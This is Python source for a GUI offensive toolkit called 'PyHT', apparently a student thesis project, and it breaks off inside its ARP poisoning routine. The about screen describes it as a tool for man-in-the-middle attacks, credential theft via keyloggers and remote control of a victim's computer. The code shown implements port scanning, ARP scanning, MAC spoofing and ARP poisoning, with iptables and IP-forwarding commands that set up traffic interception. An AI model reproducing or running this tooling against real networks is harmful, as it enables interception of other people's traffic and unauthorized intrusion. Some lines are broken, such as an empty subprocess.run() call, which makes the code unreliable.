import customtkinter as ctk
import socket,threading,netifaces,requests,time,subprocess,re,signal,sys,os,webbrowser,ast
import scapy.all as scapy
from PIL import Image, ImageTk
from concurrent.futures import ThreadPoolExecutor
from CTkMessagebox import CTkMessagebox
from pathlib import Path
from Crypto.Cipher import AES


###########################
##### CREATING CLASS ######
###########################


class Program(ctk.CTk):

## Constructor

    def __init__(self):
        super().__init__()
        self.spoofing=False
        self.flooding=False
        self.portscanner_active=False
        self.arptools_active=False
        self.sniffer_active=False
        self.c2_active=False
        self.spoofing_active=False
        self.c2_powershell_mode=False
        self.listening=False
        self.active_client=False
        self.title("RieiroTFG")
        self.geometry("1100x500")
        ctk.set_default_color_theme("dark-blue")
        ctk.set_appearance_mode("dark")
        self.resizable(False,False)
        self.right_frame=ctk.CTkFrame(self,width=700,height=480, fg_color="black",bg_color="black", corner_radius=80, border_width=4, border_color="red")
        self.right_frame.place(x=350,y=10)
        self.middle_frame=ctk.CTkFrame(self,width=700,height=400, fg_color="black",bg_color="black")
        self.middle_frame.place(x=350,y=50)
        self.top_frame=ctk.CTkFrame(self,width=485,height=600, fg_color="black",bg_color="black")
        self.top_frame.place(x=455,y=0)
        self.left_dashboard()
        self.about()
        self.font=("Hack Nerd Font",12)
        self.target=ctk.StringVar()
        self.port=ctk.StringVar()
        self.mode=ctk.StringVar()
        self.interface=ctk.StringVar()
        self.interface_flood=ctk.StringVar()
        self.open_socket=[]
        self.new_mac=ctk.StringVar()
        self.ip_availables=ctk.BooleanVar()
        self.ip_checkboxes=[]
        self.ips=[]
        self.true_ip=[]
        self.clients_socket=[]
        self.clients_socket_address={}
        self.selected_client_socket=""
        self.ngrok_token=ctk.StringVar()
        self.obfuscate_switch_option=ctk.StringVar()
        self.email=ctk.StringVar()
        self.c2_listen_port=ctk.StringVar()
        self.generate_ngrok_option=ctk.StringVar()
        self.command=ctk.StringVar()
        self.function=ctk.StringVar()
        self.victim=ctk.StringVar()
        signal.signal(signal.SIGINT, self.def_handler) 


## Capture ctrl-c

    def def_handler(self,sig,frame):
        for s in self.open_socket:
            s.close()
            self.open_socket.clear()
        interfaces=scapy.get_if_list()
        for i in interfaces:
            if len(i.split("docker"))==1:
                subprocess.run(["macchanger","-p",i])
        sys.exit(1)

## Change active option function

    def destroy_labels(self):
      if self.portscanner_active:
        self.portscanner_active_label.destroy()
        self.portscanner_active=False
      elif self.arptools_active:
        self.arptools_active_label.destroy()
        self.arptools_active=False
      elif self.sniffer_active:
        self.sniffer_active_label.destroy()
        self.sniffer_active=False
      elif self.c2_active:
        self.c2_active_label.destroy()
        self.c2_active=False

## Left Pannel Menu

    def left_dashboard(self):
        image_path = r"images/Dashboard.png"
        pil_image = Image.open(image_path)
        resized_image=pil_image.resize((100,100))
        tk_image = ImageTk.PhotoImage(resized_image)

        logo = ctk.CTkButton(self, image=tk_image, text="", width=0, height=0, fg_color="black",hover=False,command=self.about)
        logo.place(x=28,y=20)
        Autor=ctk.CTkButton(self,text="PyHT", width=100, height=50, corner_radius=80, fg_color="black",text_color="#FFF815",hover=False,bg_color="black",font=("Hack Nerd Font",15),command=self.about)
        Autor.place(x=122,y=43)
        Version=ctk.CTkButton(self,text="v1.0", width=0, height=50, corner_radius=80, fg_color="black",text_color="#32C305",hover=False,bg_color="black",font=("Hack Nerd Font",15),command=self.about)
        Version.place(x=127.3,y=74.5)

        Scanner_logo=ctk.CTkButton(self,text=" ", width=100,height=50,fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",40),command=self.scanner)
        Scanner_logo.place(x=37,y=133)
        Scanner= ctk.CTkButton(self,text="Port Scanner", width=100, height=50, corner_radius=80, fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",18),command=self.scanner)
        Scanner.place(x=100,y=135)

        Arp_logo=ctk.CTkButton(self,text="󱩊 ", width=0,height=50,fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",40),command=self.arp_tools)
        Arp_logo.place(x=53.5,y=198)
        Arp= ctk.CTkButton(self,text="ARP Tools", width=0, height=50, corner_radius=80, fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",18),command=self.arp_tools)
        Arp.place(x=100,y=202)

        Sniffer_logo= ctk.CTkButton(self,text=" ", width=0, height=50, corner_radius=80, fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",40))
        Sniffer_logo.place(x=40,y=263)
        Sniffer= ctk.CTkButton(self,text="Sniffer", width=0, height=50, corner_radius=80, fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",18),command=self.sniffer_tools)
        Sniffer.place(x=100,y=267)

        Rat_logo= ctk.CTkButton(self,text=" ", width=0, height=50, corner_radius=80, fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",40))
        Rat_logo.place(x=39.5,y=328)
        Rat=ctk.CTkButton(self,text="Command & Control", width=0, height=50, corner_radius=80, fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",18),command=self.c2_options)
        Rat.place(x=100,y=332)

        Settings_logo=ctk.CTkButton(self,text="󱁤 ", width=0,height=50,fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",40))
        Settings_logo.place(x=59,y=393)
        Settings=ctk.CTkButton(self,text="Settings", width=0, height=50, corner_radius=80, fg_color="black",text_color="red",hover=False,bg_color="black",font=("Hack Nerd Font",18))
        Settings.place(x=100,y=397)



########################
######## ABOUT #########
########################



    def about(self):
        about_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        about_frame.place(x=360,y=50)

        title_lable=ctk.CTkLabel(about_frame,text="PyHT",font=("Hack Nerd Font",20),fg_color="#171717",bg_color="#171717",text_color="#FFF815")
        title_lable.place(x=50,y=50)
        version_label=ctk.CTkLabel(about_frame,text="v1.0",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="#32C305")
        version_label.place(x=102,y=54)

        terminal_frame=ctk.CTkFrame(about_frame,width=600,height=250, fg_color="black",bg_color="black")
        terminal_frame.place(x=40,y=100)


        bash_label=ctk.CTkLabel(terminal_frame,text=" /home/PyHT",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#32C305")
        bash_label.place(x=15,y=10)

        input_label=ctk.CTkLabel(terminal_frame,text="> ",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#FFF815")
        input_label.place(x=135,y=10)

        whoami_label=ctk.CTkLabel(terminal_frame,text=" whoami",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#23B3D0")
        whoami_label.place(x=150,y=10)

        output_label=ctk.CTkLabel(terminal_frame,text="> ",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#FFF815")
        output_label.place(x=15,y=40)

        whoami_text_label=ctk.CTkLabel(terminal_frame,text="https://github.com/Riiero",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#C3C3C3")
        whoami_text_label.place(x=35,y=40)

        bash_label2=ctk.CTkLabel(terminal_frame,text=" /home/PyHT",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#32C305")
        bash_label2.place(x=15,y=70)

        input_label2=ctk.CTkLabel(terminal_frame,text="> ",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#FFF815")
        input_label2.place(x=135,y=70)

        command_version_label=ctk.CTkLabel(terminal_frame,text=" python3 PyHT.py --version",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#23B3D0")
        command_version_label.place(x=150,y=70)

        output_label=ctk.CTkLabel(terminal_frame,text="> ",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#FFF815")
        output_label.place(x=15,y=100)

        output_command_version_label=ctk.CTkLabel(terminal_frame,text="PyHT v1.0",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#C3C3C3")
        output_command_version_label.place(x=35,y=100)


        bash_label3=ctk.CTkLabel(terminal_frame,text=" /home/PyHT",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#32C305")
        bash_label3.place(x=15,y=130)

        input_label3=ctk.CTkLabel(terminal_frame,text="> ",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#FFF815")
        input_label3.place(x=135,y=130)

        command_help_label=ctk.CTkLabel(terminal_frame,text=" python3 RieiroTFG.py --help",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#23B3D0")
        command_help_label.place(x=150,y=130)

        output_label=ctk.CTkLabel(terminal_frame,text="> ",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#FFF815")
        output_label.place(x=15,y=160)

        output_command_help_label=ctk.CTkLabel(terminal_frame,text="A hacking tool that allows port scanning, man-in-the-middle ",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#C3C3C3")
        output_command_help_label.place(x=35,y=160)

        continue_command_help_label=ctk.CTkLabel(terminal_frame,text="attacks, stealing credentials via keyloggers and taking remote control",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#C3C3C3")
        continue_command_help_label.place(x=35,y=185)

        continue2_command_help_label=ctk.CTkLabel(terminal_frame,text="of the victim's computer.",font=("Hack Nerd Font",15),fg_color="black",bg_color="black",text_color="#C3C3C3")
        continue2_command_help_label.place(x=35,y=210)



###########################
###### PORT SCANNER #######
###########################


## Port Scanner Menu

    def scanner(self):
        self.destroy_labels()
        self.portscanner_active=True
        self.portscanner_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="yellow",bg_color="black",font=("Hack Nerd Font",30))
        self.portscanner_active_label.place(x=30,y=142)
        scanner_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        scanner_frame.place(x=360,y=50)

        self.terminal_ports=ctk.CTkTextbox(scanner_frame,width=600,height=200, fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",13))
        self.terminal_ports.place(x=40,y=150)
        self.terminal_ports.configure(state="disabled")

        target_label=ctk.CTkLabel(scanner_frame,text="Target",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        target_label.place(x=97,y=20)
        target_entry=ctk.CTkEntry(scanner_frame,width=150,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),textvariable=self.target,border_width=2,border_color="red")
        target_entry.place(x=50,y=50)
        if self.target.get()=="":
            target_entry.insert(0,"192.168.0.0")

        port_label=ctk.CTkLabel(scanner_frame,text="Port",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        port_label.place(x=320,y=20)
        port_entry=ctk.CTkEntry(scanner_frame,width=150,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),textvariable=self.port,border_width=2,border_color="red")
        port_entry.place(x=270,y=50)
        if self.port.get()=="":
            port_entry.insert(0,"1-65535")

        mode_label=ctk.CTkLabel(scanner_frame,text="Mode",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        mode_label.place(x=520,y=20)
        mode_menu=ctk.CTkOptionMenu(scanner_frame,values=["Slow","Normal","Fast"],variable=self.mode,width=150,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="green",dropdown_font=("Hack Nerd Font",15))
        mode_menu.place(x=470,y=50)
        mode_menu.set("Normal")

        scan_button=ctk.CTkButton(scanner_frame,text="  START" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.scan,border_width=2,border_color="red")
        scan_button.place(x=180,y=90)

        stop_button=ctk.CTkButton(scanner_frame,text="  STOP " ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.stop_scan,border_width=2,border_color="red")
        stop_button.place(x=340,y=90)

## Start Button

    def scan(self):
        self.scanning_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="green",bg_color="black",font=("Hack Nerd Font",30))
        self.scanning_active_label.place(x=30,y=142)
        scan_thread=threading.Thread(target=self.perfom_scan)
        scan_thread.start()


## Start Thread

    def perfom_scan(self):
        self.terminal_ports.configure(state="normal")
        self.terminal_ports.delete("0.0", "end")
        self.terminal_ports.insert("0.0",f"  Starting scan...\n\nIP: {self.target.get()}\nPort: {self.port.get()}\nMode: {self.mode.get()}\n\n")

        self.terminal_ports.insert("end"," Searching open ports...\n")
        ports=self.parse_ports(self.port.get())
        target=self.target.get()
        if self.mode.get()=="Slow":
            with ThreadPoolExecutor(max_workers=10) as executor: 
                executor.map(lambda port: self.scan_port(port, target), ports) 

        elif self.mode.get()=="Normal":
            with ThreadPoolExecutor(max_workers=50) as executor: 
                executor.map(lambda port: self.scan_port(port, target), ports)
        else :
            with ThreadPoolExecutor(max_workers=100) as executor: 
                executor.map(lambda port: self.scan_port(port, target), ports)

        self.scanning_active_label.destroy()
        self.terminal_ports.insert("end",f"\n\n Scan completed\n")
        self.terminal_ports.see("end")
        self.terminal_ports.configure(state="disabled")

## Create socket function

    def create_socket(self):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(0.1)
        self.open_socket.append(s)
        return s
    
## Parse ports function

    def parse_ports(self,port_str):
        if '-' in port_str: 
            start,end=map(int,port_str.split('-'))
            return range(start,end+1) 
        elif ',' in port_str:
            return map(int, port_str.split(',')) 
        else: 
          return list((int(port_str),)) 
        

## Scan Trhead 

    def scan_port(self,port,ip):
        s=self.create_socket()
        try: 
            s.connect((ip,port))
            self.terminal_ports.insert("end", f"✔ Open: {port}\n")
            self.terminal_ports.see("end")
            s.close()
        except:
            s.close()
            
## Stop Button

    def stop_scan(self):
        for s in self.open_socket:
            s.close()
        self.open_socket.clear()


############################
######## ARP-TOOLS #########
############################

## ARP Tools Menu

    def arp_tools(self):
        self.destroy_labels()
        self.arptools_active=True
        self.arptools_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="yellow",bg_color="black",font=("Hack Nerd Font",30))
        self.arptools_active_label.place(x=30,y=206)
        arp_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        arp_frame.place(x=360,y=50)
        tk_image = ImageTk.PhotoImage(Image.open(r"images/arp.jpg").resize((150,100)))
        logo = ctk.CTkButton(arp_frame, image=tk_image, text="", width=0, height=0, fg_color="black",hover=False, command=self.show_help)
        logo.place(x=255,y=148)

        scanner_button=ctk.CTkButton(arp_frame,text="  ARP Scanner ", width=100,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.arp_scanner)
        scanner_button.place(x=50,y=70)

        poison_button=ctk.CTkButton(arp_frame,text="  ARP Poisoning", width=100,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.arp_poison)
        poison_button.place(x=390,y=70)

        flood_button=ctk.CTkButton(arp_frame,text="󱪁  ARP Flooding", width=100,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.arp_flooding)
        flood_button.place(x=50,y=280)

        kill_button=ctk.CTkButton(arp_frame,text="󰯍  MAC Changer  ", width=100,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.mac_changer)
        kill_button.place(x=390,y=280)


    def show_help(self):
        CTkMessagebox(title="Help",message="ARP Scanner: \nThis tool scans the network to identify connected devices, displaying their IP and MAC addresses.\nIt is useful for obtaining a network map and detecting active devices on a subnet.\n\nARP Poisoning: \nARP Poisoning (or ARP Spoofing) is an attack in which spoofed ARP responses are sent to a local network.\nThis allows a malicious device to intercept traffic between two legitimate devices, enabling attacks\nsuch as Man-in-the-Middle (MITM).\n\nARP Flooding: \nARP Flooding is an attack that floods the network with bogus ARP responses. This causes devices on the\nnetwork to be unable to correctly resolve MAC addresses, causing disruptions in network connectivity\nand leading to a denial of service.\n\nMAC Changer: \nMAC Changer changes the MAC address of the device, this is necessary to employ ARP poisoning.",height=370, width=630,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="")


## ARP Scanner Menu


    def arp_scanner(self):
        arp_scanner_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        arp_scanner_frame.place(x=360,y=50)

        self.terminal_arp=ctk.CTkTextbox(arp_scanner_frame,width=400,height=350, fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",13))
        self.terminal_arp.place(x=250,y=30)
        self.terminal_arp.configure(state="disabled")

        interfaces_text=ctk.CTkLabel(arp_scanner_frame,text="Available interfaces",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        interfaces_text.place(x=40,y=100)

        interfaces_list=ctk.CTkOptionMenu(arp_scanner_frame,values=scapy.get_if_list(),variable=self.interface,width=183,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="green",dropdown_font=("Hack Nerd Font",15))
        interfaces_list.place(x=39,y=130)

        scan_button=ctk.CTkButton(arp_scanner_frame,text="  START" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.scan_arp,border_width=2,border_color="red")
        scan_button.place(x=55,y=180)


## Start Button

    def scan_arp(self):
        self.arping_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="green",bg_color="black",font=("Hack Nerd Font",30))
        self.arping_active_label.place(x=30,y=206)
        self.terminal_arp.configure(state="normal")
        interfaces=scapy.get_if_list()
        for i in interfaces:
          if len(i.split("docker"))==1:
                subprocess.run(["macchanger","-p",i])
        scan_thread=threading.Thread(target=self.perfom_arp_scan)
        scan_thread.start()

## Scan Thread

    def perfom_arp_scan(self):
        iface=self.interface.get()
        ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
        netmask = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['netmask']
        ip_parts = ip.split('.')
        netmask_parts = netmask.split('.')
        network_parts = [str(int(ip_parts[i]) & int(netmask_parts[i])) for i in range(4)]
        network_address = '.'.join(network_parts)


        self.terminal_arp.delete("0.0","end")
        self.terminal_arp.insert("0.0",f"  Starting scan...\n\nInterface: {iface}\nNetwork: {network_address}/24")

        ans,unans=scapy.arping(f"{network_address}/24")
        self.terminal_arp.configure(state="normal")
        try:
            for snd, rcv in ans:
                mac_address = rcv.hwsrc
                ip_address = rcv.psrc  # IP de origen


                url = f"https://api.macvendors.com/{mac_address}"
                response = requests.get(url)
                device = response.text if response.status_code == 200 else "Unknown"

                result = f"IP: {ip_address}, MAC: {mac_address}, Device: {device}"

                self.terminal_arp.insert("end", f"\n\n{result}")
                self.terminal_arp.see("end")
        except:
            pass

        self.arping_active_label.destroy()
        self.terminal_arp.insert("end",f"\n\n Scan completed\n")
        self.terminal_arp.see("end")
        self.terminal_arp.configure(state="disabled")


## MAC_CHANGER

## MAC Changer Menu

    def mac_changer(self):
        self.mac_changer_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        self.mac_changer_frame.place(x=360,y=50)

        self.terminal_mac=ctk.CTkTextbox(self.mac_changer_frame,width=600,height=130, fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",13))
        self.terminal_mac.place(x=40,y=220)
        self.terminal_mac.configure(state="disabled")

        interfaces_list_label=ctk.CTkLabel(self.mac_changer_frame,text="Available interfaces",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        interfaces_list_label.place(x=50,y=20)

        interfaces_list=ctk.CTkOptionMenu(self.mac_changer_frame,values=scapy.get_if_list(),variable=self.interface,width=250,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="green",dropdown_font=("Hack Nerd Font",15))
        interfaces_list.place(x=250,y=20)

        interfaces_list_button=ctk.CTkButton(self.mac_changer_frame,text="CHECK" ,width=50,height=30,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",15),command=self.mac_changer_checked,border_width=2,border_color="red")
        interfaces_list_button.place(x=510,y=21)

        actual_mac_label=ctk.CTkLabel(self.mac_changer_frame,text="Actual MAC",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        actual_mac_label.place(x=140,y=70)

        self.actual_mac_entry=ctk.CTkEntry(self.mac_changer_frame,width=250,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),border_width=2,border_color="red")
        self.actual_mac_entry.place(x=250,y=70)

        new_mac_label=ctk.CTkLabel(self.mac_changer_frame,text="New MAC",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        new_mac_label.place(x=168,y=120)

        self.new_mac_entry=ctk.CTkEntry(self.mac_changer_frame,width=250,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),border_width=2,border_color="red",textvariable=self.new_mac)
        self.new_mac_entry.place(x=250,y=120)

        change_button=ctk.CTkButton(self.mac_changer_frame,text="󰯍  CHANGE",width=30,height=33.5,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.start_mac_changer,border_width=2,border_color="red")
        change_button.place(x=250,y=170)

        restart_button=ctk.CTkButton(self.mac_changer_frame,text="󰦛  RESET ",width=30,height=33.5,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.reset_mac_changer,border_width=2,border_color="red")
        restart_button.place(x=383,y=170)

## Reset MAC Button

    def reset_mac_changer(self):
        self.terminal_mac.configure(state="normal")
        self.terminal_mac.delete("0.0","end")
        self.terminal_mac.insert("0.0",f"󰦛 Restoring MAC address...\n\n{subprocess.check_output(["macchanger","-p",self.interface.get()]).decode().strip()}")
        self.terminal_mac.configure(state="disabled")

## Check Button

    def mac_changer_checked(self):
        self.terminal_mac.configure(state="normal")
        self.actual_mac_entry.configure(state="normal")
        self.actual_mac_entry.delete(0,"end")
        actual_mac=subprocess.check_output(["macchanger","-s",self.interface.get()]).decode().strip().split()[2]
        self.actual_mac_entry.insert(0,actual_mac)
        self.actual_mac_entry.configure(state="disabled")
        self.terminal_mac.delete("0.0","end")
        self.terminal_mac.insert("0.0",f" MAC info\n\n{subprocess.check_output(["macchanger",self.interface.get(),"-s"]).decode().strip()}")
        self.terminal_mac.configure(state="disabled")

## Change Button

    def start_mac_changer(self):
        if re.match(r'^([A-Fa-f0-9]{2}[:]){5}[A-Fa-f0-9]{2}$', self.new_mac.get()):
            change_thread=threading.Thread(target=self.change_mac)
            change_thread.start()
            subprocess.run()
        else:
            CTkMessagebox(title="Error!",message="Enter a valid MAC address.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
            self.arping_active_label.destroy()

## Change Thread

    def change_mac(self):
        self.terminal_mac.configure(state="normal")
        self.terminal_mac.delete("0.0","end")
        self.terminal_mac.insert("0.0",f"󰯍 Changing MAC address...\n\n{subprocess.check_output(["macchanger",self.interface.get(),"-m",self.new_mac.get()]).decode().strip()}")
        self.terminal_mac.configure(state="disabled")
        self.arping_active_label.destroy()


## ARP Poisoning

## ARP Poisoning Menu

    def arp_poison(self):
        self.arp_poison_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        self.arp_poison_frame.place(x=360,y=50)
        self.arp_poison_terminal=ctk.CTkTextbox(self.arp_poison_frame,width=600,height=130, fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",13))
        self.arp_poison_terminal.place(x=40,y=220)
        self.arp_poison_terminal.configure(state="disabled")

        interfaces_text=ctk.CTkLabel(self.arp_poison_frame,text="Available interfaces",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        interfaces_text.place(x=230,y=50)

        interfaces_list=ctk.CTkOptionMenu(self.arp_poison_frame,values=scapy.get_if_list(),variable=self.interface,width=183,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="green",dropdown_font=("Hack Nerd Font",15))
        interfaces_list.place(x=229,y=80)

        scan_button=ctk.CTkButton(self.arp_poison_frame,text="CHECK" ,width=30,height=30,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.show_ip,border_width=2,border_color="red")
        scan_button.place(x=420,y=80)

        if self.spoofing:
            stop_button=ctk.CTkButton(self.arp_poison_frame,text=" STOP",width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.stop_spoof,border_width=2,border_color="red")
            stop_button.place(x=265,y=150)

## Check Button

    def show_ip(self):
        show_ip_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        show_ip_frame.place(x=360,y=50)

        check_box_frame=ctk.CTkFrame(show_ip_frame,width=680,height=400, fg_color="#171717",bg_color="#171717")
        check_box_frame.place(x=10,y=10)
     
        iface=self.interface.get()
        ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
        netmask = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['netmask']
        ip_parts = ip.split('.')
        netmask_parts = netmask.split('.')
        network_parts = [str(int(ip_parts[i]) & int(netmask_parts[i])) for i in range(4)]
        network_address = '.'.join(network_parts)


        ans,unans=scapy.arping(f"{network_address}/24")
        columna=0
        fila=0
        self.ip_checkboxes.clear()
        self.ips.clear()
        for snd,rcv in ans:
            self.ips.append(rcv.psrc)

        for i,ip in enumerate(self.ips):
            globals()[f"variable{i}"]=ctk.BooleanVar()

            checkbox=ctk.CTkCheckBox(check_box_frame,text=ip,variable=globals()[f"variable{i}"],onvalue="on", offvalue="off",fg_color="red",font=("Hack Nerd Font",12),text_color="green",hover_color="red")
            checkbox.grid(row=fila,column=columna,padx=10, pady=2, sticky="w")
            self.ip_checkboxes.append(globals()[f"variable{i}"])

            fila+=1
            if fila==10:
                columna+=1
                fila=0
        
        confirm_button=ctk.CTkButton(show_ip_frame,text="CONFIRM",width=30,height=33.5,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.spoof,border_width=2,border_color="red")
        confirm_button.place(x=275,y=320)
            
    

## Confirm Button

    def spoof(self):
        self.spoof_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
        self.spoof_frame.place(x=360,y=50)
        self.spoof_terminal=ctk.CTkTextbox(self.spoof_frame,width=600,height=130, fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",13))
        self.spoof_terminal.place(x=40,y=220)
        self.spoof_terminal.configure(state="disabled")
        self.true_ip.clear()
        self.true_ip=[self.ips[i] for i,var in enumerate(self.ip_checkboxes) if var.get()==True]

        interfaces_text=ctk.CTkLabel(self.spoof_frame,text="Available interfaces",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
        interfaces_text.place(x=230,y=50)

        interfaces_list=ctk.CTkOptionMenu(self.spoof_frame,values=scapy.get_if_list(),variable=self.interface,width=183,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),button_color="red",button_hover_color="#62090C",dropdown_fg_color="#4D0000",dropdown_text_color="green",dropdown_font=("Hack Nerd Font",15))
        interfaces_list.place(x=229,y=80)

        scan_button=ctk.CTkButton(self.spoof_frame,text="CHECK" ,width=30,height=30,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),command=self.show_ip,border_width=2,border_color="red")
        scan_button.place(x=420,y=80)

    
        spoof_button=ctk.CTkButton(self.spoof_frame,text=" POISON" ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.spoof_thread)
        spoof_button.place(x=265,y=150)

## Stop Button

    def stop_spoof(self):
        self.spoofing=False
        os.system("sudo iptables --flush")
        os.system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")
        self.spoof_terminal.configure(state="normal")
        self.spoof_terminal.delete("0.0","end")
        self.spoof_terminal.insert("0.0"," Poisoning stopped")
        self.spoofing_active_label.destroy()

## Poison Button

    def spoof_thread(self):
        self.spoofing=True
        self.spoofing_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="green",bg_color="black",font=("Hack Nerd Font",30))
        self.spoofing_active_label.place(x=30,y=206)
        spoof_thread=threading.Thread(target=self.start_spoof)
        spoof_thread.start()

## Poison Thread

    def start_spoof(self):
        actual_mac=subprocess.check_output(["macchanger","-s",self.interface.get()]).decode().strip().split()[2]
        self.true_ip=[self.ips[i] for i,var in enumerate(self.ip_checkboxes) if var.get()==True]
        iface=self.interface.get()
        gateways = netifaces.gateways()
        if netifaces.AF_INET in gateways:
            for gateway, interface, _ in gateways[netifaces.AF_INET]:
                if interface == iface:
                    gateway=gateway
                    break
        os.system(f"macchanger -A {iface}")
        os.system("iptables --flush")
        os.system("iptables --policy FORWARD ACCEPT")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system(f"iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")
